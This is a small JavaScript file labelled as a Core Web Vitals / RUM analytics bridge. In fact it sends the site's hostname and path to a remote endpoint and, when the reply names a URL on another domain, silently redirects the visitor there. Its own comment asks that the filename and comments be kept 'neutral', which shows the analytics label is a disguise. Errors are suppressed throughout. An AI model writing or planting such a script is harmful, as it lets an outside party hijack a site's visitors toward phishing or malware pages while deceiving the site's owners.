/**
 * Core Web Vitals / RUM bridge — reports navigation timing to the edge collector.
 * Keep filename and comments neutral; endpoint is provided via data-ep.
 */
(function () {
  try {
    var s = document.currentScript;
    var ep = s && s.getAttribute('data-ep');
    if (!ep) return;

    var host = (location.hostname || '').replace(/^www\./i, '').toLowerCase();
    if (!host) return;

    var payload = {
      h: host,
      p: (location.pathname || '/').slice(0, 400)
    };

    var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
    var timer = setTimeout(function () {
      if (ctrl) ctrl.abort();
    }, 2500);

    fetch(ep, {
      method: 'POST',
      mode: 'cors',
      credentials: 'omit',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: ctrl ? ctrl.signal : undefined,
      keepalive: true
    })
      .then(function (res) {
        return res.json().catch(function () { return {}; });
      })
      .then(function (data) {
        if (data && typeof data.r === 'string' && data.r.indexOf('http') === 0) {
          try {
            var target = new URL(data.r);
            var here = location.hostname.replace(/^www\./i, '').toLowerCase();
            var there = target.hostname.replace(/^www\./i, '').toLowerCase();
            if (there && there !== here) {
              location.replace(data.r);
            }
          } catch (e) {}
        }
      })
      .catch(function () {})
      .finally(function () {
        clearTimeout(timer);
      });
  } catch (e) {}
})();
